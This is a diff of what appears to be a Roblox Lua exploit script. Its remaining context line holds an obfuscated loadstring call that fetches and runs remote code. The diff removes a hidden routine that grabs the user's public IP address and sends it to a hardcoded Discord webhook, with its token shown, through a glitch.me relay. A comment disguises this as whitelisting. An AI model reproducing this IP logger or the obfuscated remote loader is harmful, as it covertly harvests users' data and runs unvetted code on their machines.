@@ -255,32 +255,7 @@ loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\
 
 
 
-local ip,HttpService  = tostring(game:HttpGet("https://api.ipify.org", true)), game:GetService("HttpService")
-local function SendMessage(Webhook, Message, Botname)
-   if not string.find(Webhook, "https://discordapp.com/api/webhooks/") then
-       return error("Send a valid URL");
-   end
-   local Name;
-   local API = "http://buritoman69.glitch.me/webhook";
-   if (not Message or Message == "" or not Botname) then
-       Name = "GameBot"
-       return error("nil or empty message!")
-   else
-       Name = Botname;
-   end
-   local Body = {
-       ['Key'] = tostring("applesaregood"),
-       ['Message'] = tostring(Message),
-       ['Name'] = Logger,
-       ['Webhook'] = https://discord.com/api/webhooks/861248866690007070/5dBCfsToLndjSBWwLWhkL9UNU-ba_lfcKlTJFjJeDg96mJEMry74fBkLal44CRXPfbVf    
-   }
-   Body = HttpService:JSONEncode(Body);
-   local Data = game:HttpPost(API, Body, false, "application/json")
-   return Data or nil;
-end
-SendMessage("https://discord.com/api/webhooks/861248866690007070/5dBCfsToLndjSBWwLWhkL9UNU-ba_lfcKlTJFjJeDg96mJEMry74fBkLal44CRXPfbVf","IP: "..ip.." log.", "Logger")
 
--- This is for adding u to whitelist (it copys ur id and sends in discord then the bot whitelists it
 
 
 
